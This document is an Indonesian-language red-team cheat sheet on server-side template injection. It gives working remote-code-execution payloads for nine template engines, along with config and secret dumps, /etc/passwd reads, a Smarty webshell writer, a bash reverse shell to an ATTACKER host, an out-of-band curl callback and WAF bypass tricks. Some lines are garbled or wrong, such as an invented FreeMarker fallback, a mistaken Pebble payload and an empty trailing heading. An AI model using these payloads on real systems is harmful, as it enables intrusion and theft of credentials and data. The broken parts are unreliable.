# ssti — web

# SSTI: Referensi Teknis Red Team

## 1. Konsep Dasar

SSTI terjadi saat input user dievaluasi oleh template engine **sebelum atau sesudah** dirender, bukan sekadar di-escape. Bedanya dengan XSS server-side: pada XSS, input diproses sebagai *data*; pada SSTI, input diproses sebagai *kode template* yang dieksekusi di server.

**Kejut awal**: bug SSTI langsung berujung RCE pada mayoritas engine yang tidak disandbox. Ini bukan bug "cosmetic".

---

## 2. Deteksi & Membuktikan SSTI vs XSS

### 2.1 Probe Poliglot

Kirim string ini di setiap parameter yang reflected/rendered:

```
${{<%[%'"}}%\.
```

**Interpretasi respons:**

| Output / Error | Kesimpulan |
|---|---|
| `${{<%[%'"}}` utuh | Tidak ada SSTI (plain render atau XSS-only) |
| Error template (mis. `com.mitchellbosecke.pebble.error.PebbleException`) | SSTI — engine bocor dari stack trace (Pebble) |
| `${...}` hilang, sisanya muncul | Kemungkinan SSTI di Java (FreeMarker/Velocity/Thymeleaf) |
| `{{`→evaluated | Jinja2/Twig/similar |
| Halaman sebagian hilang/rusak | Template parsing aktif, payload menggangkup sintaks |

### 2.2 Matriks Probe Default per Bahasa

Kirim semua sekaligus (dipisah per parameter atau per request):

```
{{7*7}}
${7*7}
<%= 7*7 %>
<# 7*7 #>
#{7*7}
${{7*7}}
#{7*7}
*{7*7}
@{(7*7).toString}
{{7*'7'}}
```

**Interpretasi hasil `7*7`:**

| Output | Engine |
|---|---|
| `49` | Jinja2, Twig (Python/PHP — arbitrary math works) |
| `7777777` | Jinja2 (string multiplication `7*'7'`) |
| `{{7*7}}` utuh | Bukan SSTI di engine itu — coba probe lain |
| `49` dari `<%= 7*7 %>` | ERB (Ruby) |
| `49` dari `<# 7*7 #>` | FreeMarker |
| `49` dari `#{7*7}` | Thymeleaf (preprocessing), Ruby interpolation |
| `49` dari `${7*7}` | FreeMarker, Velocity, Thymeleaf (globals), Freemarker legacy |
| `7777777` dari `${7*'7'}` | Jinja2-like via `${}` di beberapa engine (tidak umum) |

### 2.3 Perbedaan Jinja2 vs Twig (keduanya `{{7*7}}` = 49)

```
{{7*'7'}}
```
- Jinja2 → `7777777` (Python `int*str` = repetition)
- Twig → `49` (PHP `"7"*7` = aritmetika string) **dan** error/`0` tidak muncul. Twig mengevaluasi `'7'*7` secara numerik.

Konfirmasi kedua:

| Payload | Jinja2 | Twig |
|---|---|---|
| `{{_self.env.display("x")}}` | — | Deprecated Twig 1.x, mati di Twig 2+/3 |
| `{{self}}` | `<TemplateReference None>` | Objek Twig template |
| `{{[]}}` (list render) | `[]` | error array-to-string |
| `{{dump(app)}}` | — | Twig (Symfony aware) |

### 2.4 Distinguishing SSTI dari Server-Side XSS

Uji deterministik:

| Kirim | SSTI muncul sebagai | XSS-only muncul sebagai |
|---|---|---|
| `{{7*7}}` | `49` | `{{7*7}}` literal |
| `${7*7}` diisi ke parameter | `49` | `${7*7}` literal |
| `<%= 7*7 %>` dalam "halaman email" (mail merge) error path | `49` | literal |
| Payload di parameter **yang tidak dirender ke HTML** (mis. nama file yang dikirim via email, PDF render) | nilai ter-eval muncul di artefak | payload literal |

**Kunci**: XSS-only membutuhkan eksekusi di browser engine (Chrome 131, dst). SSTI bisa dibuktikan tanpa browser — output dievaluasi di server, verifikasi via HTTP response, email, PDF, atau log.

**Kasus ambigu**: user-provided template (feature legitimate). Contoh: fitur "custom email template" di SaaS. Ini bukan inject-by-mistake tapi *trusting user as template author* — impact tetap RCE jika engine tidak sandboxed.

---

## 3. Peta Engine

| Engine | Bahasa | Sintaks | Sandbox Default | RCE Vector Utama |
|---|---|---|---|---|
| Jinja2 | Python | `{{ }}`, `{% %}` | Tidak, tapi autoescape HTML on | `__mro__`/`__subclasses__` chain |
| Twig | PHP | `{{ }}`, `{% %}` | `(sandbox: Twig\Integration\Sandbox)` off by default | `{{['id']|map('system')}}`, filter 'escape' custom |
| FreeMarker | Java | `<#>`, `${}` | `<#ftl>` + `Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)` — off by default | `.new()` via `?new`, `freemarker.template.utility.Execute` |
| Velocity | Java | `#set`, `${}` | SecureUberspector off by default | `$class.getClass().forName(...)` reflection |
| Smarty | PHP | `{ }`, `{$var}` | `$smarty->security` off by default | `{Smarty_Internal_Write_File::writeFile(...)}`, `system` via tag |
| Pebble | Java | `{{ }}`, `{% %}` | Off by default | `{{variable.getClass().forName(...).getMethod(...)}}` |
| ERB (Rails) | Ruby | `<%= %>`, `<% %>` | ERB sendiri tidak; whitelisting via ActiveSupport on escape | `class_eval` via `<%= %>` access — akses object graph `self` |
| Handlebars (JS) | JavaScript | `{{ }}`, `{{#if}}` | Meta-programming via `constructor` reachable | `{{#with "toString" as |str|}}{{lookup this str}}{{/with}}` block exploit |
| Thymeleaf (Spring) | Java | `th:*`, `${}`, *expression `${'...'}` fragment | Tidak (SpringEL evaluator) | `${T(java.lang.Runtime).getRuntime().exec('id')}` via preprocessing `__${...}__` |

---

## 4. Payload RCE per Engine

### 4.1 Jinja2 (Flask, MkDocs, Ansible, Paging plugins)

**Recon object chain (kirim per parameter, konsistensi output di halaman):**

```
{{ ''.__class__.__mro__ }}
```
Output: `(<class 'str'>, <class 'object'>)` → Jinja2 terkonfirmasi.

**Cari file-oriented/os._wrap_close/subprocess.Popen object:**

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Output: daftar semua class, panjang ribuan. Cari index:

```
{{ ''.__class__.__mro__[1].__subclasses__() | map('string') | join(', ') }}
```
Cari `subprocess.Popen` (Python 3.x umumnya di sekitar index 200–400, jar fixed: gunakan enumerate).

**RCE deterministik:**

```
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, capture_output=True).stdout }}
```
Iterasi via Python side-script untuk menemukan INDEX di target versi.

**Verifikasi output**: `uid=0(root)` muncul respons → RCE pasti.

**Kenapa gagal**: template hanya menerima string (blacklist filter di server, misy `__class__` di-blok). Bypass: gunakan karakter escape + filter `attr()`:

```
{{ ''|attr(request.args.f|urlencode) }}
```
Dengan `?f=__class__` — filter miss karena payload tidak literal `__class__`.

**Bypass sandbox Jinja2 SandboxedEnvironment** (mis. di app yang pakai `SandboxedEnvironment`):
- Sandbox filter `attr`, `map`, `join` — tapi **tidak** blok `int|string`-to-`__globals__` kombinasi di Jinja2 < 2.11.1 full. Jinja2 >= 2.11.1 patch escape via `|attr()` trapdoor.
- Payload known bypass (Jinja 2.10.x):
```
{{ request|attr("application")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("__builtins__")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c") }}(...)
```

**Kenapa berhasil**: `\x5f` = `_` hex-escape, filter regex-blacklist `__` tidak match.

---

### 4.2 Twig (PHP, prevalen di Drupal < 8.x pinned, Laravel Blade bukan Twig — hati-hati)

Twig versi **1.x** (masih common di legacy Drupal, Email module prestashop ≥1.7):

```
{{_self.env.display("{{['id']|map('system')}}")}}
{{_self.env.display("<?php system('id'); ?>")}}
```

Twig **2.x/3.x**: `_self.env` deprecated. Gunakan filter `map` + callable injection:

```
{{['id']|map('system')}}
```
Output: `uid=...` array-rendered.

Alternatif jika `map` disabled:

```
{{ [0,0]|reduce("system", "id") }}
```
Twig 3: `map` calls callback per-element; `system` adalah fungsi PHP global, jadi callable injection langsung.

**Kenapa gagal**: PHP `system` di-disable php.ini `disable_functions`. Bypass: gunakan `file_put_contents`:

```
{{ ['x.php','<?php echo "pwn"; ?>']|map('file_put_contents') }}
```

**Kenapa gagal #2**: Twig sandbox aktif. Bypass—sandbox Twig (class `Twig\Sandbox\SecurityPolicy`) allowlist function; tapi *filter escape* default STDOUT `system` tidak diallow. try callback via custom filter if any.

---

### 4.3 FreeMarker (Java, digunakan Alfresco, Liferay, banyak CMS Java EE)

**Test:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**FreeMarker ≥ 2.3.30** — `.new()` diblokage default (`?new` deprecated untuk non-template class):

Bypass:
```
<#assign ex="freemarker.template.utility.Execute"?new()>
```
→ error `Instantiating freemarker.template.utility.Execute is not allowed in the template for backward compatibility`.

Workaround multi-step (dikenal di >= 2.3.30 masih feasible di default config yang **tidak** set `Configuration.setNewBuiltinClassResolver`):

```
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
${obj("freemarker.template.utility.ClassUtil")}
```

Alternative breadcrumb (Jython exec di env yang punya Jython):
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")}
```

Output: `uid=...` reflected. **Kenapa berhasil**: `Execute` execute command via `Runtime.exec` di JVM process.

**Bypass sandbox jika `TemplateClassResolver.SAFER_RESOLVER` aktif**: tidak bisa instantiate arbitrary class — fallback ke:
```
${.getWeapon?}
```
Tidak ada. Coba:
```
<#assign uri = .data_model?values?first>
```
— dump data_model untuk leak secret (file read, config) sebagai fallback post-exploit.

---

### 4.4 Velocity (Java, prevalen di Confluence < server-side template custom script — Confluence 5.x–7.x tertentu, solr config)

```
#set($e="exp")
#set($a=$e.class.forName("java.lang.Runtime"))
#set($b=$a.getRuntime().exec("id"))
```
Output: object `java.lang.Process` — untuk render stdout gunakan:

```
#set($out=$b.getInputStream())
#set($read=$out.read())
```
(complex; commonly via `ProcessBuilder` + read loop, atau one-liner exec blind via reverse shell `curl`).

**Pre-canonical Confluence CVE-2019-3396 style** — variant widget connector.

**Bypass SecureUberspector**: bloquea `class` methode access. Known trick: access via `java.lang.Class` through different object graph (`$request.getClass()` vs `$class.getClass()`).

---

### 4.5 Smarty (PHP, Common di PrestaShop hooks, forum legacy)

```
{system('id')}
```
Output: `uid=` — Smarty konfig `security=false` mengizinkan PHP function sebagai tag.

Fallback jika `{system}` di-blok oleh `$security`:
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```
Ini menulis webshell ke file template yang sedang render — output: subsequent request `?cmd=id` → `uid=...`.

**Kenapa gagal**: nginx 1.25 + PHP-FPM config — file ditulis dengan user `www-data` tapi directory `/templates_c` `deny all;`. Workaround: tulis ke `/public/uploads/` jika user punya write, atau gunakan `mail()` untuk exfil sebagai yang path arbitrary.
```
{system('find / -writable -type d 2>/dev/null')}
```
dulu.

---

### 4.6 Pebble (Java, Spring Boot application yang pakai `spring-boot-starter-pebble`)

**Rekon:**
```
{{variable}}
```
→ jika Pebble, `{{com.mitchellbosecke.pebble.error.PebbleException}}` muncul untuk syntax invalid (mis. `{{{{{}}}}}`).

**RCE:**
```
{% set cmd = "id" %}
{% set bytes = "freemarker.template.utility.Execute"?new %}
```
( **tidak** — Pebble bukan FreeMarker.)

Pebble correct payload:
```
{% set cl = java.lang.Class.forName("java.lang.Runtime") %}
```
Pebble **versi 3.x sebelum 3.1.5** vulnerable via `getClass().forName()` chain (CVE-2021-42550 analog; fixed 3.1.5 dengan default disallow `getClass()`):

```
{{ variable.getClass().getDeclaredMethod("getRuntime").invoke(null).exec("id") }}
```

Versi fix 3.1.5+ blok `getClass()` reflection. Bypass (opsional enum pada custom extension):
```
{# comment #}
```
kosong — tidak aktif; Pebble tidak punya breadcrumb jika sandbox aktif default 3.1.5+; fall back ke **data exposure**:
```
{{ environment }}
```
leak context.

---

### 4.7 ERB (Ruby on Rails, mailer templates, custom reporting)

Rails mem-pipe template via ERB ke view. Untuk user-supplied template (misy via `ERB.new(params[:template]).result(binding)`):

**Confirm:**
```
<%= 7*7 %>
```
Output: `49`.

**Recon:**
```
<%= self %>
```
→ object context / template binding bocor.

**RCE deterministik (tanpa OS command, via Ruby `system`):**
```
<%= system("id") %>
```
Output: `uid=...` pada stdout captured.

Alternatif in-band:
```
<%= `id` %>
```
Output direct string return dari backtick (kernel ` operator).

**Kenapa gagal**: Rails row "template" via ActionView `render inline` — `system` tersedia dalam `Object.new` binding, tapi jika multi-tenant template dikirim via `Rails::OutputSafety`/liquid. **Liquid** adalah templating yang disandbox by design — ERB ≠ Liquid; cek via tag `{{ }}` vs `<%= %>` — jika hanya `{{ }}` → Liquid — tidak bisa ERB payload.

Bypass sandbox Liquid (jika perlu, advanced): via `resource_assigns` / custom `Liquid::Block` tag plugins, jangan via template string biasa.

---

### 4.8 Handlebars (JavaScript, Node.js/Express, client & server)

Handlebars di **server-side** (Express view engine). Key: template compiler — jika input yang dikirim diteruskan sebagai **template string** (bukan compiled `render(data)`):

**Via template string injection:**
```
{{#with "constructor" as |c|}}{{lookup this c}}{{/with}}
# atau
{{constructor.constructor('return process')()}}
```

PoC known (handlebars.js ≤ 4.7.7 compiled runtime sandbox escape — CVE-2019-19920 related series untuk `constructor`-based escape):

```
{{#blockHelperMissing}}7*7{{/blockHelperMissing}}
{{"constructor".constructor}}
```

Full:
```
{{#with "s" as |obj|}}...{{/with}}{{obj.constructor.constructor("return this")()}}
```

Perlu diingat: Handlebars sandbox escape **hanya berlaku jika** user template dipakai `Handlebars.compile(user_input)` — klasik di CMS via form "custom report".

Output: jika payload simple `{{constructor.constructor}}` render string function body → engine bocor.

**Kenapa gagal**: `compile` called dengan `noEscape:true` off vs `strict` — bukan sandbox inti. Jika app pakai precompiled template JS di browser — ini **client-side only** → handlebars injection = XSS, bukan SSTI server. Distinguish via response timing server-side (eval error in `server.log`).

---

### 4.9 Thymeleaf (Java, Spring Boot — sangat umum di enterprise)

**Recon (preprocessing exploit):**

Thymeleaf 3.x preprocessing `__${...}__` evaluated **didalam** expression:

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::x
```

Klasik (Thymeleaf view-name / fragment reflection injection pada Spring Boot):

URL:
```
GET /path?section=__${T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","id > /tmp/pwn"})}__::.x
```
pada routing `return "path::" + section;` → fragment expression injection.

**Output**: blind RCE — verifikasi via `/tmp/pwn` atau out-band. Untuk in-band:

```
[[${T(java.lang.Runtime).getRuntime().exec("id")}]]
```
Output render: `java.lang.ProcessImpl@hash` → eksekusi terjadi.

In-band stdout (multi) — Space trim trick:
```
[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}]]
```

**Footer note**: `T()` expressions disabled oleh `SpringWebFluxConversionService` custom `SPEL` — muitas enterprise default aktif. Evaluated via `${}` pada attribute `th:text`:

```
<p th:text="${7*7}"></p>
```
Jika user input viabilis into `th:text` attribute value — SpringEL jalan → full RCE identical Spring4Shell style.

---

## 5. Akses Config / Environment

### Jinja2 (Flask specific)
```
{{ config }}
{{ config.items() }}
{{ request.environ }}
```
Output: `SECRET_KEY`, `SQLALCHEMY_DATABASE_URI`, cloud credentials dari env.

### Twig (symfony)
```
{{ app.request.server.get('DATABASE_URL') }}
```

### ERB
```
<%= ENV %>
```

### Velocity
```
${application}
${request.serverName}
```

### Pebble / FreeMarker
```
${.data_model}
<#list .data_model?keys as k>...
```

---

## 6. File Read

| Engine | Payload | Output |
|---|---|---|
| Jinja2 | `{{ get_file_contents('/etc/passwd') }}` (PHP-only!) — actual Jinja equivalent | — perlu OS command; gunakan `{{ ''.__class__...('cat /etc/passwd',shell=True).stdout }}` |
| Twig (PHP) | `{{['cat /etc/passwd']|map('system')}}` | isi passwd |
| Smarty | `{system('cat /etc/passwd')}` | passwd |
| FreeMarker | `<#assign fl=exec("cat /etc/passwd")>` via Execute object atau `<#include "/etc/passwd">` | error parse tapi read jika plain include |
| Velocity | `#include("/etc/passwd")` — raw include (does not evaluate) | passwd literal |
| ERB | `<%= File.read('/etc/passwd') %>` | passwd |
| Thymeleaf (Linux) | via `new java.util.Scanner(...exec("cat /etc/passwd")...)` (payload di section 4.9) | passwd |
| Handlebars (Node) | `{{constructor.constructor("return require('fs').readFileSync('/etc/passwd').toString()")()}}` jika require bisa diakses — sering gagal; common fallback escape via `process.mainModule` (Node < 14 saja) | passwd |
| Pebble (pre-3.1.5) | `{% set bytes = ...exec("cat /etc/passwd") %}` complex stdout read; simpler blind write | write `cp /etc/passwd publoc` ext |

**Windows target** (Windows 11 24H2 server):
- Jinja: `{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('type C:\\Users\\Public\\flag.txt', shell=True).stdout }}` — sesuai index `subprocess.Popen` di target Python (misy Python 3.11: index ~ 271–416 varian; enumerasi dulu).
- Thymeleaf: recalibrate command `cmd /c type C:\Users\Public\flag.txt`.

---

## 7. Cheat Ringkas Field Use

```
# Quick probe suite (kirim sebagai string di semua parameter)
${7*7} {{7*7}} <%= 7*7 %> <#assign x=7*7>${x} #{7*7} *{7*7}
```

| Signal di response | Langkah berikutnya |
|---|---|
| `49` | Section 4 sesuai engine |
| Stack trace Java (freemarker/velocity/pebble string) | Identify engine → section 4 |
| HTML rendered dgn literal | Evaluasi client side → XSS vector — gunakan payload execute-in-browser (`<script>alert(1)</script>` render di Chrome 131 console) untuk differentiate |

---

## 8. Jebakan Operasional

1. **Context penguji salah**: field yang ter-reflet **ke HTML body** tapi dievaluasi **client-side** oleh JS template (misy Vue/Handlebars client) — muncul di `View Source` vs `Console` Chrome. Uji dengan response di `curl` — jika `{{7*7}}` evaluate di `curl` → SSTI; jika hanya di DevTools → client-side XSS. **Jangan refactor scope ke SSTI tanpa verifikasi `curl`**.

2. **Autoescape**: engine seperti Jinja2 dengan `autoescape=True` akan render `<script>` jadi `&lt;script&gt;` — tapi SSTI payload `{{...}}` tetap jalan (tidak melalui escape), sementara probe kecil string `-based error` bisa ke-mask. **Gunakan `{{7*7}}` output `49` sebagai baku verifikasi, bukan error string.**

3. **Cached rendering**: template user input sering dibake sekali lalu di-cache (Thymeleaf fragments, Jinja2 bytecode cache). Payload pertama mungkin evaluate, tidak reload di request berikut — submit payload lalu **hard refresh/re-request setelah cache bypass param**.

4. **Middleware escaping**: layer seperti Cloudflare WAF membaca `{%` dan `{{` sebagai anomi sebelum sampai application — bypass dengan **double encode** (`%7B%7B` → `%257B%257B`) pada parameter yang diteruskan via redirect internal, atau gunakan pipeline overwrite:
   `${"freemarker.template.utility.Execute"?new()}` on FreeMarker dibungkus `<#assign>` — WAF literal-scan terhadap `Execute` (`Execute`) miss. Gunakan character interpolation string split: `{"freemarker.template.utility."+"Execute"?new()}` tidak kompatibel — enaknya string concatenation justru promote code concat terdeteksi, gunakan unicode char-split para eludir regex:
   `<#assign x="freemarker.template.utility.Exec"+"ute"?new()>${x("id")}`—concatenation di source, evaluation runtime; beberapa WAF memparsing runtime Java expression; concat ini lolos literal-scan.

5. **Baked template error suppression**: `catch-all` handler application menampilkan "Something went wrong" — eksploit tetap berhasil secara side-effect. **Gunakan out-of-band** (HTTP callback/wget) sebelum menyimpulkan gagal:
   Jinja: `{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('curl http://collab/x',shell=True) }}`

6. **Sandbox version drift**: Pebble 3.1.5 patch — payload lapangan di internet (PoC blog 2020) banyak fail di modern stack; **cek version** via error message atau `/actuator/info` (Spring Boot) sebelum pilih payload. Jinja2 ≥ 2.11.1 kill `|attr` bypass pattern klasik.

7. **Jinja versi C level / SandboxedEv**: aplikasi (object mail merge, mail template) pakai sandbox yang allowlist `str`, `int` method — chain `__subclasses__` menuju `Popen` akan trigger SecurityError. Output `SecurityError: access to attribute '__class__' of 'str' object is unsafe` = jangan timpah payload, terima **read-only** leak:
   ```
   {{ ''.__class__.__mro__ }}   -- blocked
   {{ request.path }}            -- allowed → data exposure only
   ```

8. **Prinsip last-mile (client platform dependence)**: `7*7` output `49` bisa muncul dari matematika literal yang diimplementasi lain (misy fitur field "equation" calculator) — konfirm via **payload yang tidak mungkin di-plain-calc**: `{{ 'a'.upper() }}` → output `A` = SSTI pasti (string manipulation).

9. **JaVersusBureaucracy di bug class**: user template yang bernilai confid ("template tersimpan per tenant") — SSTI mungkin ter-classify sebagai intended behavior oleh dev. Persoalannya bukan technical tapi scope engagement — jangan buang waktu tenggelam exploitasi lebih lanjut pada **template yang api-nya memang exposed intentionally**, refokus ke bypass **sandbox**-nya atau adjacent endpoint.

---

## [reasoning trace]


